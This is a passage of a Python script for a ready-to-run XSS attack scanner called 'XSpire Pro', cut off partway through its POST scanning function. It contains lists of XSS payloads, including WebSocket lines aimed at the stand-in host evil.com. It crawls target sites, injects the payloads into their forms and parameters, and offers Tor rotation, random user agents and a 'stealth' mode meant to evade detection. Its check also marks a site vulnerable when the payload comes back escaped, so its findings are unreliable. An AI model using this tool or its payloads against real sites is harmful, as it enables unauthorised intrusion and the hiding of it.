#!/usr/bin/env python3
import requests
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box
import argparse
from urllib.parse import urlparse, parse_qs, urljoin
from bs4 import BeautifulSoup
import concurrent.futures
import time
import random
import os
from datetime import datetime
from fake_useragent import UserAgent
import socks
import socket
from stem import Signal
from stem.control import Controller
import json
import html
import re
from websocket import create_connection
import asyncio
from urllib.robotparser import RobotFileParser


VERSION = "V1.0"

#
console = Console()


try:
    import requests, bs4, rich, fake_useragent, stem, websocket
except ImportError as e:
    console.print(f"[red]Missing dependency: {e}. Please install required packages.[/red]")
    console.print("[yellow]Run: pip install requests rich beautifulsoup4 fake-useragent PySocks stem websocket-client[/yellow]")
    exit(1)

# Directory structure for additional payloads
PAYLOAD_DIRS = {
    'Blind_XSS': ['blind_xss.txt', 'blind_xss_encoded.txt'],
    'Contextual_XSS': ['contextual_xss.txt', 'contextual_xss_encoded.txt'],
    'Event_Based_XSS': ['event_based_xss.txt', 'event_based_xss_encoded.txt'],
    'Mutated_XSS': ['mutated_xss.txt', 'mutated_xss_encoded.txt'],
    'Self_XSS': ['self_xss.txt', 'self_xss_encoded.txt'],
    'SVG_PDF_XSS': ['svg_pdf_xss.txt', 'svg_pdf_xss_encoded.txt']
}

def load_payloads_from_files():
    """Load payloads from text files in specified directories"""
    payloads = {
        'HTML': [
            {"payload": "<script>alert(1)</script>", "risk": "High"},
            {"payload": "'><script>alert('XSS')</script>", "risk": "High"},
            {"payload": "<img src=x onerror=alert('XSS')>", "risk": "High"},
            {"payload": "<svg onload=alert(1)>", "risk": "High"},
            {"payload": "<body onload=alert('XSS')>", "risk": "High"},
            {"payload": "<iframe src=javascript:alert(1)>", "risk": "High"}
        ],
        'Attribute': [
            {"payload": "\" onmouseover=alert(1)", "risk": "Medium"},
            {"payload": "' onfocus=alert(1) autofocus='", "risk": "Medium"},
            {"payload": "javascript:alert(1)", "risk": "High"},
            {"payload": "x\" autofocus onfocus=alert(1)//", "risk": "Medium"},
            {"payload": "x' onerror=alert(1)//", "risk": "Medium"}
        ],
        'DOM': [
            {"payload": "#javascript:alert(1)", "risk": "High"},
            {"payload": "#\" onmouseover=\"alert(1)", "risk": "Medium"},
            {"payload": "</script><script>alert(1)</script>", "risk": "High"},
            {"payload": "{{constructor.constructor('alert(1)')()}}", "risk": "High"},
            {"payload": "<img src='x' onerror=eval(URL.hash.slice(1))>#alert(1)", "risk": "High"}
        ],
        'Encoding': [
            {"payload": "%3Cscript%3Ealert(1)%3C/script%3E", "risk": "Medium"},
            {"payload": "<script>alert(1)</script>", "risk": "Low"},
            {"payload": "javascrip%74:alert(1)", "risk": "Medium"}
        ],
        'Special': [
            {"payload": "<iframe srcdoc='<script>alert(1)</script>'>", "risk": "High"},
            {"payload": "<details open ontoggle=alert(1)>", "risk": "Medium"},
            {"payload": "<video><source onerror=alert(1)>", "risk": "Medium"},
            {"payload": "<object data=javascript:alert(1)>", "risk": "High"},
            {"payload": "<embed src=javascript:alert(1)>", "risk": "High"}
        ],
        'Polyglot': [
            {"payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>", "risk": "High"},
            {"payload": "'\"><img src=xxx:x onerror=javascript:alert(1)>", "risk": "High"},
            {"payload": "<svg/onload=alert(1)//", "risk": "High"}
        ],
        'WebSocket': [
            {"payload": "ws://evil.com/xss", "risk": "High"},
            {"payload": "wss://evil.com/xss", "risk": "High"},
            {"payload": "javascript:alert(1)", "risk": "High"}
        ]
    }

    script_dir = os.path.dirname(os.path.abspath(__file__))
    for category, files in PAYLOAD_DIRS.items():
        payloads[category] = []
        category_dir = os.path.join(script_dir, category)
        if not os.path.exists(category_dir):
            console.print(f"[yellow]Warning: Directory {category_dir} not found. Skipping {category} payloads.[/yellow]")
            continue
        for file_name in files:
            file_path = os.path.join(category_dir, file_name)
            if os.path.exists(file_path):
                try:
                    with open(file_path, 'r', encoding='utf-8') as f:
                        for line in f:
                            payload = line.strip()
                            if payload:
                                risk = "High" if "encoded" not in file_name.lower() else "Medium"
                                payloads[category].append({"payload": payload, "risk": risk})
                    console.print(f"[green]Loaded payloads from {file_path}[/green]")
                except Exception as e:
                    console.print(f"[yellow]Warning: Could not read {file_path}: {e}[/yellow]")
            else:
                console.print(f"[yellow]Warning: File {file_path} not found.[/yellow]")
        if not payloads[category]:
            del payloads[category]
    return payloads


payloads = load_payloads_from_files()

class AdvancedCrawler:
    def __init__(self, base_url, proxy=None, user_agent=None, cookies=None, max_depth=2):
        self.base_url = base_url
        self.proxy = proxy
        self.user_agent = user_agent
        self.cookies = cookies or {}
        self.max_depth = max_depth
        self.visited_urls = set()
        self.urls_to_visit = set()
        self.forms = []
        self.ws_endpoints = []
        self.session = requests.Session()
        
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        if user_agent:
            self.session.headers.update({'User-Agent': user_agent})
        if cookies:
            self.session.cookies.update(cookies)
    
    def is_valid_url(self, url):
        parsed = urlparse(url)
        return bool(parsed.netloc) and parsed.netloc == urlparse(self.base_url).netloc
    
    def get_links(self, url):
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
      
            for link in soup.find_all('a', href=True):
                href = link['href']
                full_url = urljoin(url, href)
                if self.is_valid_url(full_url) and full_url not in self.visited_urls:
                    self.urls_to_visit.add(full_url)
            
         
            self.extract_forms(url, soup)
            
           
            self.detect_websockets(response.text)
            
        except Exception as e:
            console.print(f"[yellow]Error crawling {url}: {e}[/yellow]")
    
    def extract_forms(self, url, soup):
        for form in soup.find_all('form'):
            form_data = {
                'action': urljoin(url, form.get('action', '')),
                'method': form.get('method', 'GET').upper(),
                'inputs': []
            }
            
            for input_tag in form.find_all('input'):
                form_data['inputs'].append({
                    'name': input_tag.get('name'),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', '')
                })
            
            for select_tag in form.find_all('select'):
                form_data['inputs'].append({
                    'name': select_tag.get('name'),
                    'type': 'select',
                    'options': [option.get('value') for option in select_tag.find_all('option')]
                })
            
            for textarea_tag in form.find_all('textarea'):
                form_data['inputs'].append({
                    'name': textarea_tag.get('name'),
                    'type': 'textarea',
                    'value': textarea_tag.get('value', '')
                })
            
            self.forms.append(form_data)
    
    def detect_websockets(self, text):
        # Simple regex to find WebSocket connections
        ws_patterns = [
            r"new WebSocket\(['\"](.*?)['\"]\)",
            r"\.connect\(['\"](.*?)['\"]\)"
        ]
        
        for pattern in ws_patterns:
            matches = re.finditer(pattern, text)
            for match in matches:
                ws_url = match.group(1)
                if ws_url.startswith(('ws://', 'wss://')):
                    self.ws_endpoints.append(ws_url)
    
    def crawl(self):
        self.urls_to_visit.add(self.base_url)
        
        for depth in range(self.max_depth):
            current_urls = list(self.urls_to_visit)
            self.urls_to_visit = set()
            
            for url in current_urls:
                if url not in self.visited_urls:
                    self.visited_urls.add(url)
                    self.get_links(url)
        
        return {
            'urls': list(self.visited_urls),
            'forms': self.forms,
            'websockets': list(set(self.ws_endpoints))
        }

class WebSocketTester:
    def __init__(self, proxy=None):
        self.proxy = proxy
    
    def test_websocket(self, ws_url, payload):
        try:
            ws = create_connection(ws_url)
            ws.send(payload)
            result = ws.recv()
            ws.close()
            
            # Check if payload is reflected
            if payload in result:
                return True
            return False
        except Exception as e:
            console.print(f"[red]WebSocket error: {e}[/red]")
            return False

class TorManager:
    def __init__(self, control_port=9051):
        self.proxy = 'socks5://127.0.0.1:9050'
        self.control_port = control_port
        
    def renew_tor_identity(self):
        try:
            with Controller.from_port(port=self.control_port) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
                console.print("[green]Tor identity renewed successfully[/green]")
        except Exception as e:
            console.print(f"[red]Error renewing Tor identity: {e}[/red]")
    
    def get_session(self):
        session = requests.Session()
        session.proxies = {'http': self.proxy, 'https': self.proxy}
        return session

def print_banner():
    banner = """[bold cyan]
██╗  ██╗███████╗███████╗██████╗ ██╗██████╗ ███████╗
██║  ██║██╔════╝██╔════╝██╔══██╗██║██╔══██╗██╔════╝
███████║███████╗█████╗  ██████╔╝██║██████╔╝█████╗  
██╔══██║╚════██║██╔══╝  ██╔═══╝ ██║██╔═══╝ ██╔══╝  
██║  ██║███████║███████╗██║     ██║██║     ███████╗
╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝     ╚══════╝
[/bold cyan]"""
    console.print(banner)
    console.print(Panel(f"[bold yellow]XSpire Pro - Advanced XSS Scanner (Version: {VERSION})[/bold yellow]", 
                     subtitle="by Security Researcher", style="blue"))
    console.print(Panel("[bold green]Features:[/bold green] [cyan]WebSocket Scanning | Auto-Crawling | Form Detection | Risk Assessment | Input Reflection Analysis | Proxies/Tor Support | Multithreading | HTML Reports | Stealth Mode | WAF Detection | Parameter Extraction | Advanced Payloads[/cyan]", 
                     style="blue"))

def list_files():
    """Display the directory structure and payload files"""
    table = Table(title="[bold]Payload Files and Directories[/bold]", box=box.ROUNDED)
    table.add_column("Directory", style="cyan")
    table.add_column("Files", style="blue")
    
    for directory, files in PAYLOAD_DIRS.items():
        table.add_row(directory, ", ".join(files))
    
    console.print(table)

def display_commands():
    """Display all available commands with descriptions"""
    table = Table(title="[bold]Available Commands[/bold]", box=box.ROUNDED)
    table.add_column("Command", style="cyan")
    table.add_column("Description", style="blue")
    
    commands = [
        ("--url", "Target URL for GET-based XSS scanning"),
        ("--post", "Target URL for POST-based XSS scanning"),
        ("--data", "POST data template (e.g., user=admin&pass=test)"),
        ("--params", "Custom parameters to test (comma-separated)"),
        ("--proxy", "Proxy to use (e.g., http://127.0.0.1:8080)"),
        ("--tor", "Use Tor for anonymity"),
        ("--user-agent", "Custom User-Agent string"),
        ("--random-agent", "Use a random User-Agent for each request"),
        ("--cookies", "Cookies to send (e.g., session=abc123;token=xyz)"),
        ("--stealth", "Enable stealth mode with random delays for evasion"),
        ("--crawl", "Enable auto-crawling of the target site"),
        ("--threads", "Number of threads to use (1-20, default: 5)"),
        ("--report", "Generate an HTML report with the specified filename"),
        ("--list-files", "Display the directory structure and payload files"),
        ("--help-commands", "Show this list of available commands")
    ]
    
    for cmd, desc in commands:
        table.add_row(cmd, desc)
    
    console.print(table)

def detect_protections(url, proxy=None, user_agent=None, cookies=None):
    """Detect security protections on the target website"""
    protections = []
    headers_to_check = {
        'X-XSS-Protection': 'XSS Filter',
        'Content-Security-Policy': 'CSP Protection',
        'X-Content-Type-Options': 'MIME Sniffing Protection',
        'X-Frame-Options': 'Clickjacking Protection',
        'X-Powered-By': 'Server Technology'
    }
    
    try:
        session = requests.Session()
        
        if proxy:
            session.proxies = {'http': proxy, 'https': proxy}
        
        if user_agent:
            session.headers.update({'User-Agent': user_agent})
        
        if cookies:
            session.cookies.update(cookies)
        
        response = session.get(url, timeout=10)
        headers = response.headers
        
        for header, protection in headers_to_check.items():
            if header in headers:
                protections.append(f"{protection}: [green]{headers[header]}[/green]")
            else:
                protections.append(f"{protection}: [red]Not Detected[/red]")
                
        # Check for WAF
        waf_detected = False
        server_header = headers.get('server', '').lower()
        waf_indicators = {
            'cloudflare': 'Cloudflare',
            'akamai': 'Akamai',
            'imperva': 'Imperva',
            'aws': 'AWS WAF',
            'barracuda': 'Barracuda',
            'fortiweb': 'FortiWeb'
        }
        
        for indicator, name in waf_indicators.items():
            if indicator in server_header:
                protections.append(f"WAF Detected: [red]{name}[/red]")
                waf_detected = True
                break
        
        if not waf_detected:
            # Check for other WAF indicators
            waf_headers = ['x-waf-event', 'x-protected-by', 'x-security']
            for h in waf_headers:
                if h in headers:
                    protections.append(f"WAF Detected: [red]{headers[h]}[/red]")
                    waf_detected = True
                    break
        
        if not waf_detected:
            protections.append("WAF: [green]Not Detected[/green]")
            
    except Exception as e:
        protections.append(f"[yellow]Error detecting protections: {e}[/yellow]")
    
    return protections

def print_protections(protections):
    """Print protection detection results"""
    prot_table = Table(title="[bold]Security Protections Detection[/bold]", box=box.ROUNDED)
    prot_table.add_column("Protection Type", style="cyan")
    prot_table.add_column("Status", style="bold")
    
    for protection in protections:
        parts = protection.split(":", 1)
        if len(parts) == 2:
            prot_table.add_row(parts[0].strip(), parts[1].strip())
        else:
            prot_table.add_row(protection, "")
    
    console.print(prot_table)

def detect_input_reflection(response, payload):
    """Detect where the input is reflected in the response"""
    reflection_points = []
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Check in HTML content
    if payload in response.text:
        reflection_points.append("HTML Content")
    
    # Check in JavaScript
    script_tags = soup.find_all('script')
    for script in script_tags:
        if script.string and payload in script.string:
            reflection_points.append("JavaScript (inline)")
        elif payload in str(script):
            reflection_points.append("JavaScript (tag)")
    
    # Check in attributes
    for tag in soup.find_all():
        for attr, value in tag.attrs.items():
            if isinstance(value, str) and payload in value:
                reflection_points.append(f"Attribute: {attr}")
            elif isinstance(value, list) and any(payload in v for v in value):
                reflection_points.append(f"Attribute: {attr} (list)")
    
    # Check for encoded versions
    encoded_payload = html.escape(payload)
    if encoded_payload in response.text:
        reflection_points.append("HTML Encoded")
    
    url_encoded = requests.utils.quote(payload)
    if url_encoded in response.text:
        reflection_points.append("URL Encoded")
    
    return list(set(reflection_points)) if reflection_points else ["No Reflection Found"]

def analyze_reflection_location(response, payload):
    """Detailed analysis of reflection location with risk assessment"""
    locations = []
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Check specific HTML elements
    elements_to_check = ['script', 'img', 'a', 'input', 'div', 'span', 'p', 'style', 
                        'textarea', 'iframe', 'svg', 'marquee', 'select', 'button']
    
    for element in elements_to_check:
        for tag in soup.find_all(element):
            if payload in str(tag):
                locations.append(f"<{element}> element")
                if element == 'a' and 'href' in tag.attrs:
                    if payload in tag['href']:
                        locations.append("href attribute (High Risk)")
                if element == 'img' and 'src' in tag.attrs:
                    if payload in tag['src']:
                        locations.append("src attribute (High Risk)")
                if element == 'input' and 'value' in tag.attrs:
                    if payload in tag['value']:
                        locations.append("value attribute (Medium Risk)")
                if element == 'iframe' and 'srcdoc' in tag.attrs:
                    if payload in tag['srcdoc']:
                        locations.append("srcdoc attribute (High Risk)")
    
    # Check for DOM XSS indicators
    dom_indicators = {
        'eval(': 'High Risk',
        'innerHTML': 'Medium Risk',
        'document.write': 'High Risk',
        'setTimeout(': 'Medium Risk',
        'setInterval(': 'Medium Risk',
        'Function(': 'High Risk'
    }
    
    for indicator, risk in dom_indicators.items():
        if indicator in response.text:
            locations.append(f"DOM XSS Potential ({risk})")
    
    return list(set(locations))

def check_dom_xss(url, payload, method, data_template=None, proxy=None, user_agent=None, cookies=None):
    """Check for potential DOM XSS using requests and JavaScript analysis"""
    try:
        session = requests.Session()
        
        if proxy:
            session.proxies = {'http': proxy, 'https': proxy}
        
        if user_agent:
            session.headers.update({'User-Agent': user_agent})
        
        if cookies:
            session.cookies.update(cookies)
        
        if method == 'GET':
            test_url = f"{url}{'&' if '?' in url else '?'}{payload}"
            response = session.get(test_url, timeout=15)
        else:
            if not data_template:
                return False, None
            data = {key: payload if key == list(data_template.keys())[0] else "test" for key in data_template.keys()}
            response = session.post(url, data=data, timeout=15)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        script_tags = soup.find_all('script')
        
        # Check for payload in script tags or attributes
        for script in script_tags:
            if script.string and payload in script.string:
                return True, "DOM XSS Potential in inline script (High Risk)"
        
        # Check for payload in attributes that could execute JavaScript
        for tag in soup.find_all():
            for attr, value in tag.attrs.items():
                if attr in ['onload', 'onerror', 'onmouseover', 'onfocus'] and payload in value:
                    return True, f"DOM XSS Potential in {attr} attribute (High Risk)"
        
        # Check for dangerous JavaScript functions with payload
        dangerous_functions = ['eval(', 'document.write(', 'innerHTML', 'setTimeout(', 'setInterval(', 'Function(']
        for func in dangerous_functions:
            if func in response.text and payload in response.text:
                return True, f"DOM XSS Potential with {func} (High Risk)"
        
        return False, None
    except Exception as e:
        console.print(f"[yellow]DOM XSS check error: {e}[/yellow]")
        return False, None

def extract_parameters(url, proxy=None, user_agent=None, cookies=None):
    """Advanced parameter extraction from the page"""
    parameters = set()
    try:
        session = requests.Session()
        
        if proxy:
            session.proxies = {'http': proxy, 'https': proxy}
        
        if user_agent:
            session.headers.update({'User-Agent': user_agent})
        
        if cookies:
            session.cookies.update(cookies)
        
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Extract from forms
        for form in soup.find_all('form'):
            for input_tag in form.find_all('input'):
                if input_tag.get('name'):
                    parameters.add(input_tag.get('name'))
            for select_tag in form.find_all('select'):
                if select_tag.get('name'):
                    parameters.add(select_tag.get('name'))
            for textarea_tag in form.find_all('textarea'):
                if textarea_tag.get('name'):
                    parameters.add(textarea_tag.get('name'))
        
        # Extract from query string
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            parameters.update(params.keys())
            
        # Extract from JavaScript (advanced pattern matching)
        script_tags = soup.find_all('script')
        for script in script_tags:
            if script.string:  # Only process scripts with inline content
                # Look for AJAX parameters
                ajax_patterns = [
                    r'\.get\([^)]*["\']([^"\']+)["\']',
                    r'\.post\([^)]*["\']([^"\']+)["\']',
                    r'\.ajax\([^)]*url\s*:\s*["\']([^"\']+)["\']',
                    r'fetch\([^)]*["\']([^"\']+)["\']',
                    r'axios\.(get|post)\([^)]*["\']([^"\']+)["\']'
                ]
                
                for pattern in ajax_patterns:
                    matches = re.finditer(pattern, script.string)
                    for match in matches:
                        url_part = match.group(1) if match.lastindex >= 1 else match.group(0)
                        if '?' in url_part:
                            query_part = url_part.split('?')[1]
                            query_params = parse_qs(query_part)
                            parameters.update(query_params.keys())
            
                # Look for form data parameters
                form_data_patterns = [
                    r'FormData\([^)]*\.append\(["\']([^"\']+)["\']',
                    r'new URLSearchParams\([^)]*\.append\(["\']([^"\']+)["\']'
                ]
                
                for pattern in form_data_patterns:
                    matches = re.finditer(pattern, script.string)
                    for match in matches:
                        if match.lastindex >= 1:
                            parameters.add(match.group(1))
            
    except Exception as e:
        console.print(f"[yellow]Error extracting parameters: {e}[/yellow]")
    
    return list(parameters)

def generate_html_report(results, scan_params, filename="xss_report.html"):
    """Generate HTML report with scan results"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Prepare vulnerability summary with risk levels
    vuln_summary = {}
    for result in results:
        if result['status'] == 'VULNERABLE':
            risk_level = result.get('risk', 'Medium')
            if result['parameter'] not in vuln_summary:
                vuln_summary[result['parameter']] = {'High': 0, 'Medium': 0, 'Low': 0}
            vuln_summary[result['parameter']][risk_level] += 1
    
    # Prepare protection info
    protection_info = ""
    if 'protections' in scan_params:
        protection_info = "<h3>Protections Detected:</h3><ul>"
        for protection in scan_params['protections']:
            protection_info += f"<li>{protection}</li>"
        protection_info += "</ul>"
    
    # Prepare vulnerability summary HTML
    vuln_summary_html = ""
    if vuln_summary:
        vuln_summary_html = "<h3>Vulnerability Summary:</h3>"
        for param, counts in vuln_summary.items():
            vuln_summary_html += f"""
            <div class="vuln-param">
                <strong>{param}:</strong>
                <span class="high-risk">{counts['High']} High risk</span>,
                <span class="medium-risk">{counts['Medium']} Medium risk</span>,
                <span class="low-risk">{counts['Low']} Low risk</span>
            </div>
            """
    else:
        vuln_summary_html = '<p class="safe">No vulnerabilities found</p>'
    
    html_template = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>XSS Scan Report - {timestamp}</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 20px; }}
            h1, h2, h3 {{ color: #2c3e50; }}
            .summary {{ background-color: #f8f9fa; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
            .vulnerable {{ color: #e74c3c; font-weight: bold; }}
            .safe {{ color: #2ecc71; }}
            .warning {{ color: #f39c12; }}
            table {{ width: 100%; border-collapse: collapse; margin-top: 20px; margin-bottom: 20px; }}
            th, td {{ padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }}
            th {{ background-color: #3498db; color: white; }}
            tr:nth-child(even) {{ background-color: #f2f2f2; }}
            .payload {{ max-width: 300px; overflow-wrap: break-word; }}
            .vuln-summary {{ margin-bottom: 20px; }}
            .vuln-param {{ margin-bottom: 10px; }}
            .high-risk {{ color: #e74c3c; font-weight: bold; }}
            .medium-risk {{ color: #f39c12; font-weight: bold; }}
            .low-risk {{ color: #f1c40f; }}
            .risk-high {{ background-color: #ffdddd; }}
            .risk-medium {{ background-color: #fff4dd; }}
            .risk-low {{ background-color: #ffffdd; }}
        </style>
    </head>
    <body>
        <h1>XSS Scan Report (Version: {VERSION})</h1>
        <p>Generated on: {timestamp}</p>
        
        <div class="summary">
            <h2>Scan Summary</h2>
            <p><strong>Target URL:</strong> {scan_params.get('url', 'N/A')}</p>
            <p><strong>Scan Type:</strong> {scan_params.get('type', 'N/A')}</p>
            <p><strong>Parameters Tested:</strong> {', '.join(scan_params.get('params', [])) if scan_params.get('params') else 'N/A'}</p>
            <p><strong>Total Payloads Tested:</strong> {scan_params.get('payload_count', 0)}</p>
            <p><strong>Vulnerabilities Found:</strong> <span class="{'vulnerable' if any(r['status'] == 'VULNERABLE' for r in results) else 'safe'}">
                {sum(1 for r in results if r['status'] == 'VULNERABLE')}</span></p>
            
            {vuln_summary_html}
            
            {protection_info}
        </div>
        
        <h2>Scan Results</h2>
        <table>
            <tr>
                <th>Parameter</th>
                <th>Payload Type</th>
                <th>Payload</th>
                <th>Reflection Points</th>
                <th>Risk Level</th>
                <th>Status</th>
            </tr>
            {"".join(
                f'<tr class="risk-{r.get("risk", "medium").lower()}">'
                f'<td>{r["parameter"]}</td>'
                f'<td>{r["payload_type"]}</td>'
                f'<td class="payload">{html.escape(r["payload"])}</td>'
                f'<td>{", ".join(r["reflection_points"]) if r["reflection_points"] else "None"}</td>'
                f'<td>{r.get("risk", "Medium")}</td>'
                f'<td class="{"vulnerable" if r["status"] == "VULNERABLE" else "safe"}">{r["status"]}</td>'
                f'</tr>'
                for r in results
            )}
        </table>
        
        <h2>Scan Details</h2>
        <p><strong>Scan Duration:</strong> {scan_params.get('duration', 'N/A')}</p>
        <p><strong>User Agent:</strong> {scan_params.get('user_agent', 'N/A')}</p>
        <p><strong>Proxy Used:</strong> {scan_params.get('proxy', 'None')}</p>
        <p><strong>Stealth Mode:</strong> {'Yes' if scan_params.get('stealth', False) else 'No'}</p>
        <p><strong>Threads Used:</strong> {scan_params.get('threads', 1)}</p>
        <p><strong>Crawled URLs:</strong> {scan_params.get('crawled_urls', 0)}</p>
        <p><strong>Forms Found:</strong> {scan_params.get('forms_found', 0)}</p>
        <p><strong>WebSockets Found:</strong> {scan_params.get('websockets_found', 0)}</p>
    </body>
    </html>
    """
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(html_template)
    
    return os.path.abspath(filename)

def scan_parameter(url, param, payload_type, payload_dict, method='GET', data_template=None, 
                  stealth=False, proxy=None, user_agent=None, cookies=None):
    """Scan a single parameter with a specific payload"""
    payload = payload_dict['payload']
    risk_level = payload_dict.get('risk', 'Medium')
    
    result = {
        'parameter': param,
        'payload_type': payload_type,
        'payload': payload,
        'risk': risk_level,
        'reflection_points': [],
        'status': 'Not Vulnerable'
    }
    
    try:
        # Configure session
        session = requests.Session()
        
        if proxy:
            session.proxies = {'http': proxy, 'https': proxy}
        
        if user_agent:
            session.headers.update({'User-Agent': user_agent})
        
        if cookies:
            session.cookies.update(cookies)
        
        # Stealth mode delay
        if stealth:
            time.sleep(random.uniform(0.5, 3))
        
        if method == 'GET':
            test_url = f"{url}{'&' if '?' in url else '?'}{param}={payload}"
            response = session.get(test_url, timeout=15)
        else:
            data = {key: payload if key == param else "test" for key in data_template.keys()}
            response = session.post(url, data=data, timeout=15)
        
        # Check for reflection
        reflection_points = detect_input_reflection(response, payload)
        result['reflection_points'] = reflection_points
        
        # Detailed location analysis with risk assessment
        detailed_locations = analyze_reflection_location(response, payload)
        
        # Check if payload is reflected and executable
        vulnerable = False
        if payload in response.text:
            vulnerable = True
        else:
            # Check for encoded versions
            encoded_payload = html.escape(payload)
            if encoded_payload in response.text:
                vulnerable = True
        
        # Additional checks for DOM XSS
        if not vulnerable and any(indicator in response.text for indicator in ['eval(', 'innerHTML', 'document.write']):
            if payload in response.text:
                vulnerable = True
                result['reflection_points'].append("DOM XSS Potential (High Risk)")
        
        # Alternative DOM XSS check using requests
        if not vulnerable:
            is_vulnerable, dom_xss_detail = check_dom_xss(
                url,
                payload,
                method,
                data_template,
                proxy,
                user_agent,
                cookies
            )
            if is_vulnerable:
                vulnerable = True
                if dom_xss_detail:
                    result['reflection_points'].append(dom_xss_detail)
        
        if vulnerable:
            result['status'] = 'VULNERABLE'
            result['reflection_points'].extend(detailed_locations)
            result['reflection_points'] = list(set(result['reflection_points']))
        
    except requests.exceptions.RequestException as e:
        result['error'] = f"Request failed: {str(e)}"
    except Exception as e:
        result['error'] = f"Unexpected error: {str(e)}"
    
    return result

def scan_websocket(ws_url, payload, proxy=None):
    """Test WebSocket endpoint for XSS vulnerability"""
    result = {
        'url': ws_url,
        'payload': payload,
        'status': 'Not Vulnerable',
        'risk': 'High'
    }
    
    try:
        ws_tester = WebSocketTester(proxy)
        if ws_tester.test_websocket(ws_url, payload):
            result['status'] = 'VULNERABLE'
            result['reflection_points'] = ["WebSocket message reflection"]
    except Exception as e:
        result['error'] = str(e)
    
    return result

def scan_get(url, params=None, stealth=False, proxy=None, user_agent=None, cookies=None, 
             threads=5, crawl=False):
    """Scan URL with GET method"""
    start_time = time.time()
    
    # Crawl the site if requested
    crawled_data = None
    if crawl:
        console.print("[yellow]Starting site crawl...[/yellow]")
        crawler = AdvancedCrawler(url, proxy, user_agent, cookies)
        crawled_data = crawler.crawl()
        console.print(f"[green]Crawling completed. Found {len(crawled_data['urls'])} URLs, {len(crawled_data['forms'])} forms, and {len(crawled_data['websockets'])} WebSocket endpoints.[/green]")
    
    protections = detect_protections(url, proxy, user_agent, cookies)
    print_protections(protections)
    
    if not params:
        params = extract_parameters(url, proxy, user_agent, cookies)
        if params:
            console.print(Panel(f"[green]Extracted parameters: {', '.join(params)}[/green]"))
        else:
            console.print(Panel("[red]No parameters found![/red] Please specify manually.", style="red"))
            return [], {}
    
    results = []
    total_payloads = sum(len(payloads[pt]) for pt in payloads) * len(params)
    completed = 0
    
    with console.status("[bold green]Scanning...[/bold green]") as status:
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for param in params:
                for payload_type in payloads:
                    for payload_dict in payloads[payload_type]:
                        futures.append(
                            executor.submit(
                                scan_parameter,
                                url=url,
                                param=param,
                                payload_type=payload_type,
                                payload_dict=payload_dict,
                                method='GET',
                                stealth=stealth,
                                proxy=proxy,
                                user_agent=user_agent,
                                cookies=cookies
                            )
                        )
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                results.append(result)
                completed += 1
                status.update(f"[bold green]Scanning...[/bold green] ({completed}/{total_payloads} payloads tested)")
    
    # Test WebSocket endpoints if found during crawl
    if crawl and crawled_data['websockets']:
        console.print("[yellow]Testing WebSocket endpoints...[/yellow]")
        ws_payloads = payloads.get('WebSocket', [])
        
        for ws_url in crawled_data['websockets']:
            for payload_dict in ws_payloads:
                ws_result = scan_websocket(ws_url, payload_dict['payload'], proxy)
                ws_result['payload_type'] = 'WebSocket'
                ws_result['risk'] = payload_dict.get('risk', 'High')
                results.append(ws_result)
    
    duration = time.time() - start_time
    
    scan_meta = {
        'protections': protections,
        'duration': duration,
        'crawled_urls': len(crawled_data['urls']) if crawl else 0,
        'forms_found': len(crawled_data['forms']) if crawl else 0,
        'websockets_found': len(crawled_data['websockets']) if crawl else 0
    }
    
    return results, scan_meta

def scan_post(url, data_template=None, params=None, stealth=False, proxy=None, 
              user_agent=None, cookies=None, threads=5, crawl=False):
    """Scan URL with POST method"""
    start_time = time.time()
    
    # Crawl the site if requested
    crawled_data = None
    if crawl:
        console.print("[yellow]Starting site crawl...[/yellow]")
        crawler = AdvancedCrawler(url, proxy, user_agent, cookies)
        crawled_data = crawler.crawl()
        console.print(f"[green]Crawling completed. Found {len(crawled_data['urls'])} URLs, {len(crawled_data['forms'])} forms, and {len(crawled_data['websockets'])} WebSocket endpoints.[/green]")
    
    protections = detect_protections(url, proxy, user_agent, cookies)
    print_protections(protections)
    
    if not data_template and not params:
        params = extract_parameters(url, proxy, user_agent, cookies)
        if params:
            console.print(Panel(f"[green]Extracted parameters: {', '.join(params)}[/green]"))
            data_template = {param: "test" for param in params}
        else:
            console.print(Panel("[red]No parameters found![/red] Please specify manually.", style="red"))
            return [], {'protections': protections, 'duration': 0, 'crawled_urls': 0, 'forms_found': 0, 'websockets_found': 0}
    elif params and not data_template:
        data_template = {param: "test" for param in params}
    
    results = []
    total_payloads = sum(len(payloads[pt]) for pt in payloads) * len(data_template)
    completed = 0
    
    with console.status("[bold green]Scanning...[/bold green]") as status:
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for param in data_template:
                for payload_type in payloads:
                    for payload_dict in payloads[payload_type]:
                        futures.append(
                            executor.submit(
                                scan_parameter,
                                url=url,
                                param=param,
                                payload_type=payload_type,
                                payload_dict=payload_dict,
                                method='POST',
                                data_template=data_template,
                                stealth=stealth,
                                proxy=proxy,
                                user_agent=user_agent,
                                cookies=cookies
                            )
                        )
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                results.append(result)
                completed += 1
                status.update(f"[bold green]Scanning...[/bold green] ({completed}/{total_payloads} payloads tested)")
    
    # Test WebSocket endpoints if found during crawl
    if crawl and crawled_data['websockets']:
        console.print("[yellow]Testing WebSocket endpoints...[/yellow]")
        ws_payloads = payloads.get('WebSocket', [])
        
        for ws_url in crawled_data['websockets']:
            for payload_dict in ws_payloads:
